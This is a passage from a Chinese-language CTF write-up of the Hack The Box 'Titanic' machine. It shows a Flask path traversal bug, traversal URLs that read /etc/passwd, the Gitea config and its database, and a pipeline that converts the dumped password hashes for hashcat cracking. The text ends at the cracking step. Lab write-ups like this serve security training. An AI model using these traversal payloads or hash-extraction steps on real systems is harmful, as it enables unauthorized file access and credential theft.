src="https://img.dkdun.cn/v1/2025/12/533b8088f4935b23.png"></p><p>内容如下</p><p><img src="https://img.dkdun.cn/v1/2025/12/2dd9e9d8777690ed.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/a61f7ac027a75a78.png"></p><p>app.py 文件有路径遍历漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, send_file, render_template, redirect, url_for, Response<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> uuid <span class="hljs-keyword">import</span> uuid4<br><br>app = Flask(__name__)<br><br>TICKETS_DIR = <span class="hljs-string">&quot;tickets&quot;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(TICKETS_DIR):<br>    os.makedirs(TICKETS_DIR)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/book&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">book_ticket</span>():<br>    data = &#123;<br>        <span class="hljs-string">&quot;name&quot;</span>: request.form[<span class="hljs-string">&#x27;name&#x27;</span>],<br>        <span class="hljs-string">&quot;email&quot;</span>: request.form[<span class="hljs-string">&#x27;email&#x27;</span>],<br>        <span class="hljs-string">&quot;phone&quot;</span>: request.form[<span class="hljs-string">&#x27;phone&#x27;</span>],<br>        <span class="hljs-string">&quot;date&quot;</span>: request.form[<span class="hljs-string">&#x27;date&#x27;</span>],<br>        <span class="hljs-string">&quot;cabin&quot;</span>: request.form[<span class="hljs-string">&#x27;cabin&#x27;</span>]<br>    &#125;<br><br>    ticket_id = <span class="hljs-built_in">str</span>(uuid4())<br>    json_filename = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ticket_id&#125;</span>.json&quot;</span><br>    json_filepath = os.path.join(TICKETS_DIR, json_filename)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(json_filepath, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> json_file:<br>        json.dump(data, json_file)<br><br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;download_ticket&#x27;</span>, ticket=json_filename))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/download&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_ticket</span>():<br>    ticket = request.args.get(<span class="hljs-string">&#x27;ticket&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ticket:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Ticket parameter is required&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>    json_filepath = os.path.join(TICKETS_DIR, ticket)<br><br>    <span class="hljs-keyword">if</span> os.path.exists(json_filepath):<br>        <span class="hljs-keyword">return</span> send_file(json_filepath, as_attachment=<span class="hljs-literal">True</span>, download_name=ticket)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Ticket not found&quot;</span>&#125;), <span class="hljs-number">404</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p><code>download_ticket</code> 路由直接使用用户传入的 <code>ticket</code> 参数拼接文件路径，可以构造像  <code>../../etc/passwd</code> 这样的路径来读取文件</p><p>访问试一下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://titanic.htb/download?ticket=../../../etc/passwd<br></code></pre></td></tr></table></figure><p>读取下载的文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs cmd">┌──(root㉿butt3rf1y)-[/home/butt3rf1y/Downloads]<br>└─# cat  _.._.._etc_passwd<br><span class="hljs-function">root:<span class="hljs-title">x</span>:0:0:<span class="hljs-title">root</span>:/<span class="hljs-title">root</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">daemon:x</span>:1:1:<span class="hljs-title">daemon</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">bin:x</span>:2:2:<span class="hljs-title">bin</span>:/<span class="hljs-title">bin</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">sys:x</span>:3:3:<span class="hljs-title">sys</span>:/<span class="hljs-title">dev</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">sync:x</span>:4:65534:<span class="hljs-title">sync</span>:/<span class="hljs-title">bin</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">sync</span></span><br><span class="hljs-function"><span class="hljs-title">games:x</span>:5:60:<span class="hljs-title">games</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">games</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">man:x</span>:6:12:<span class="hljs-title">man</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">cache</span>/<span class="hljs-title">man</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">lp:x</span>:7:7:<span class="hljs-title">lp</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">spool</span>/<span class="hljs-title">lpd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">mail:x</span>:8:8:<span class="hljs-title">mail</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">mail</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">news:x</span>:9:9:<span class="hljs-title">news</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">spool</span>/<span class="hljs-title">news</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">uucp:x</span>:10:10:<span class="hljs-title">uucp</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">spool</span>/<span class="hljs-title">uucp</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">proxy:x</span>:13:13:<span class="hljs-title">proxy</span>:/<span class="hljs-title">bin</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">www</span>-<span class="hljs-title">data:x</span>:33:33:<span class="hljs-title">www</span>-<span class="hljs-title">data</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">www</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">backup:x</span>:34:34:<span class="hljs-title">backup</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">backups</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">list:x</span>:38:38:<span class="hljs-title">Mailing</span> <span class="hljs-title">List</span> <span class="hljs-title">Manager</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">list</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">irc:x</span>:39:39:<span class="hljs-title">ircd</span>:/<span class="hljs-title">run</span>/<span class="hljs-title">ircd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">gnats:x</span>:41:41:<span class="hljs-title">Gnats</span> <span class="hljs-title">Bug</span>-<span class="hljs-title">Reporting</span> <span class="hljs-title">System</span> (<span class="hljs-title">admin</span>):/<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">gnats</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">nobody:x</span>:65534:65534:<span class="hljs-title">nobody</span>:/<span class="hljs-title">nonexistent</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">_apt:x</span>:100:65534::/<span class="hljs-title">nonexistent</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">systemd</span>-<span class="hljs-title">network:x</span>:101:102:<span class="hljs-title">systemd</span> <span class="hljs-title">Network</span> <span class="hljs-title">Management</span>,,,:/<span class="hljs-title">run</span>/<span class="hljs-title">systemd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">systemd</span>-<span class="hljs-title">resolve:x</span>:102:103:<span class="hljs-title">systemd</span> <span class="hljs-title">Resolver</span>,,,:/<span class="hljs-title">run</span>/<span class="hljs-title">systemd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">messagebus:x</span>:103:104::/<span class="hljs-title">nonexistent</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">systemd</span>-<span class="hljs-title">timesync:x</span>:104:105:<span class="hljs-title">systemd</span> <span class="hljs-title">Time</span> <span class="hljs-title">Synchronization</span>,,,:/<span class="hljs-title">run</span>/<span class="hljs-title">systemd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">pollinate:x</span>:105:1::/<span class="hljs-title">var</span>/<span class="hljs-title">cache</span>/<span class="hljs-title">pollinate</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">false</span></span><br><span class="hljs-function"><span class="hljs-title">sshd:x</span>:106:65534::/<span class="hljs-title">run</span>/<span class="hljs-title">sshd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">syslog:x</span>:107:113::/<span class="hljs-title">home</span>/<span class="hljs-title">syslog</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">uuidd:x</span>:108:114::/<span class="hljs-title">run</span>/<span class="hljs-title">uuidd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">tcpdump:x</span>:109:115::/<span class="hljs-title">nonexistent</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">tss:x</span>:110:116:<span class="hljs-title">TPM</span> <span class="hljs-title">software</span> <span class="hljs-title">stack</span>,,,:/<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">tpm</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">false</span></span><br><span class="hljs-function"><span class="hljs-title">landscape:x</span>:111:117::/<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">landscape</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">fwupd</span>-<span class="hljs-title">refresh:x</span>:112:118:<span class="hljs-title">fwupd</span>-<span class="hljs-title">refresh</span> <span class="hljs-title">user</span>,,,:/<span class="hljs-title">run</span>/<span class="hljs-title">systemd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">usbmux:x</span>:113:46:<span class="hljs-title">usbmux</span> <span class="hljs-title">daemon</span>,,,:/<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">usbmux</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">developer:x</span>:1000:1000:<span class="hljs-title">developer</span>:/<span class="hljs-title">home</span>/<span class="hljs-title">developer</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">lxd:x</span>:999:100::/<span class="hljs-title">var</span>/<span class="hljs-title">snap</span>/<span class="hljs-title">lxd</span>/<span class="hljs-title">common</span>/<span class="hljs-title">lxd</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">false</span></span><br><span class="hljs-function"><span class="hljs-title">dnsmasq:x</span>:114:65534:<span class="hljs-title">dnsmasq</span>,,,:/<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">misc</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">_laurel:x</span>:998:998::/<span class="hljs-title">var</span>/<span class="hljs-title">log</span>/<span class="hljs-title">laurel</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">false</span></span><br></code></pre></td></tr></table></figure><p>有 <code>developer</code>  用户</p><p><code>docker-compose.yml</code> 文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">gitea:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">gitea/gitea</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">gitea</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;127.0.0.1:3000:3000&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;127.0.0.1:2222:22&quot;</span>  <span class="hljs-comment"># Optional for SSH access</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">/home/developer/gitea/data:/data</span> <span class="hljs-comment"># Replace with your path</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">USER_UID=1000</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">USER_GID=1000</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/1752ede4d753a45e.png"></p><p>通过 <code>gitea</code> 的手册找到配置文件路径，结合 <code>docker-compose.yml</code>  中的文件路径下载配置文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/conf/app.ini<br></code></pre></td></tr></table></figure><p>读取配置文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs cmd">┌──(root㉿butt3rf1y)-[/home/butt3rf1y/Downloads]<br>└─# cat _.._.._home_developer_gitea_data_gitea_conf_app.ini<br>APP_NAME = Gitea: Git with a cup of tea<br>RUN_MODE = prod<br>RUN_USER = git<br>WORK_PATH = /data/gitea<br><br>[repository]<br>ROOT = /data/git/repositories<br><br>[repository.local]<br>LOCAL_COPY_PATH = /data/gitea/tmp/local-repo<br><br>[repository.upload]<br>TEMP_PATH = /data/gitea/uploads<br><br>[server]<br>APP_DATA_PATH = /data/gitea<br>DOMAIN = gitea.titanic.htb<br>SSH_DOMAIN = gitea.titanic.htb<br>HTTP_PORT = <span class="hljs-number">3000</span><br>ROOT_URL = http://gitea.titanic.htb/<br>DISABLE_SSH = false<br>SSH_PORT = <span class="hljs-number">22</span><br>SSH_LISTEN_PORT = <span class="hljs-number">22</span><br>LFS_START_SERVER = true<br>LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4<br>OFFLINE_MODE = true<br><br>[database]<br><span class="hljs-built_in">PATH</span> = /data/gitea/gitea.db<br>DB_TYPE = sqlite3<br>HOST = localhost:<span class="hljs-number">3306</span><br>NAME = gitea<br>USER = root<br>PASSWD =<br>LOG_SQL = false<br>SCHEMA =<br>SSL_MODE = disable<br><br>[indexer]<br>ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve<br><br>[session]<br>PROVIDER_CONFIG = /data/gitea/sessions<br>PROVIDER = file<br><br>[picture]<br>AVATAR_UPLOAD_PATH = /data/gitea/avatars<br>REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars<br><br>[attachment]<br><span class="hljs-built_in">PATH</span> = /data/gitea/attachments<br><br>[log]<br><span class="hljs-built_in">MODE</span> = console<br>LEVEL = info<br>ROOT_PATH = /data/gitea/log<br><br>[security]<br>INSTALL_LOCK = true<br>SECRET_KEY =<br>REVERSE_PROXY_LIMIT = <span class="hljs-number">1</span><br>REVERSE_PROXY_TRUSTED_PROXIES = *<br>INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8<br>PASSWORD_HASH_ALGO = pbkdf2<br><br>[service]<br>DISABLE_REGISTRATION = false<br>REQUIRE_SIGNIN_VIEW = false<br>REGISTER_EMAIL_CONFIRM = false<br>ENABLE_NOTIFY_MAIL = false<br>ALLOW_ONLY_EXTERNAL_REGISTRATION = false<br>ENABLE_CAPTCHA = false<br>DEFAULT_KEEP_EMAIL_PRIVATE = false<br>DEFAULT_ALLOW_CREATE_ORGANIZATION = true<br>DEFAULT_ENABLE_TIMETRACKING = true<br>NO_REPLY_ADDRESS = noreply.localhost<br><br>[lfs]<br><span class="hljs-built_in">PATH</span> = /data/git/lfs<br><br>[mailer]<br>ENABLED = false<br><br>[openid]<br>ENABLE_OPENID_SIGNIN = true<br>ENABLE_OPENID_SIGNUP = true<br><br>[cron.update_checker]<br>ENABLED = false<br><br>[repository.pull-request]<br>DEFAULT_MERGE_STYLE = merge<br><br>[repository.signing]<br>DEFAULT_TRUST_MODEL = committer<br><br>[oauth2]<br>JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5ccf2c79c20f6a7a.png"></p><p>找到了 <code>gitea.db</code> 的路径 </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">PATH</span> = /data/gitea/gitea.db<br></code></pre></td></tr></table></figure><p>curl 下来</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">curl --<span class="hljs-built_in">path</span>-as-is -o gitea.db http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db<br></code></pre></td></tr></table></figure><p>查询一下数据库内容</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cmd">┌──(root㉿butt3rf1y)-[/gitea]<br>└─# sqlite3 gitea.db &quot;SELECT name, passwd, salt FROM user;&quot;<br>administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|<span class="hljs-number">2</span>d149e5fbd1b20cf31db3e3c6a28fc9b<br>developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|<span class="hljs-number">8</span>bf3e3452b78544f8bee9400d6936d34<br>joe|e8b6651ada9f663eb58fe9f91749e25ebb701ce68d8af03e41254d9b4cfa3a959db6dd4fe8b0928c4bfe0a2648fe0f7ccfc8|<span class="hljs-number">1626</span>a36ea942a7d1b34f06b23e2d89e7<br><span class="hljs-number">1</span>syn1|<span class="hljs-number">9</span>fbfa80ae243bacab37c5e10c2b8558f18bf3bc17b23d782a55d795143714e1ed87f9cc01422a6c5519e649a9e20783c7be9|bda65bd7bb76331c2076c23347cd156d<br>kilobyte|<span class="hljs-number">98</span>d6a67dd155352c962c26c0008412960e3130d64e1fd23514e2ae8059930457b05989e64eb6c5418b1f8bf6c27b47431ab8|<span class="hljs-number">216</span>d42075eef581be952be3a31bfd58d<br></code></pre></td></tr></table></figure><p>把内容转为 hashcat 能爆破的格式</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">sqlite3 gitea.db &quot;SELECT passwd, salt, name FROM user&quot; | awk -F &#x27;|&#x27; &#x27;&#123;<span class="hljs-built_in">cmd</span> = &quot;<span class="hljs-built_in">echo</span> -n &quot; $<span class="hljs-number">1</span> &quot; | xxd -r -p | base64&quot;; <span class="hljs-built_in">cmd</span> | getline digest; close(<span class="hljs-built_in">cmd</span>);<span class="hljs-built_in">cmd</span> = &quot;<span class="hljs-built_in">echo</span> -n &quot; $<span class="hljs-number">2</span> &quot; | xxd -r -p | base64&quot;; <span class="hljs-built_in">cmd</span> | getline salt; close(<span class="hljs-built_in">cmd</span>);printf &quot;<span class="hljs-variable">%s:sha256:50000:%</span>s:%s\n&quot;, $<span class="hljs-number">3</span>, salt, digest;&#125;&#x27; | tee gitea.hashes<br></code></pre></td></tr></table></figure><p>如下</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">administrator:<span class="hljs-title">sha256</span>:50000:<span class="hljs-title">LRSeX70bIM8x2z48aij8mw</span>==:<span class="hljs-title">y6IMz5J9OtBWe2gWFzLT</span>+8<span class="hljs-title">oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY</span>=</span><br><span class="hljs-function"><span class="hljs-title">developer:sha256</span>:50000:<span class="hljs-title">i</span>/<span class="hljs-title">PjRSt4VE</span>+<span class="hljs-title">L7pQA1pNtNA</span>==:5<span class="hljs-title">THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO</span>/<span class="hljs-title">F2</span>+8<span class="hljs-title">wvxaCYZJjRE6llM</span>+1<span class="hljs-title">Y</span>=</span><br><span class="hljs-function"><span class="hljs-title">joe:sha256</span>:50000:<span class="hljs-title">FiajbqlCp9GzTwayPi2J5w</span>==:6<span class="hljs-title">LZlGtqfZj61j</span>+<span class="hljs-title">n5F0niXrtwHOaNivA</span>+<span class="hljs-title">QSVNm0z6OpWdtt1P6LCSjEv</span>+<span class="hljs-title">CiZI</span>/<span class="hljs-title">g98z8g</span>=</span><br><span class="hljs-function">1<span class="hljs-title">syn1:sha256</span>:50000:<span class="hljs-title">vaZb17t2MxwgdsIzR80VbQ</span>==:<span class="hljs-title">n7</span>+<span class="hljs-title">oCuJDusqzfF4QwrhVjxi</span>/<span class="hljs-title">O8F7I9eCpV15UUNxTh7Yf5zAFCKmxVGeZJqeIHg8e</span>+<span class="hljs-title">k</span>=</span><br><span class="hljs-function"><span class="hljs-title">kilobyte:sha256</span>:50000:<span class="hljs-title">IW1CB17vWBvpUr46Mb</span>/<span class="hljs-title">VjQ</span>==:<span class="hljs-title">mNamfdFVNSyWLCbAAIQSlg4xMNZOH9I1FOKugFmTBFewWYnmTrbFQYsfi</span>/<span class="hljs-title">bCe0dDGrg</span>=</span><br></code></pre></td></tr></table></figure><p>爆破得到密码</p><figure class="highlight 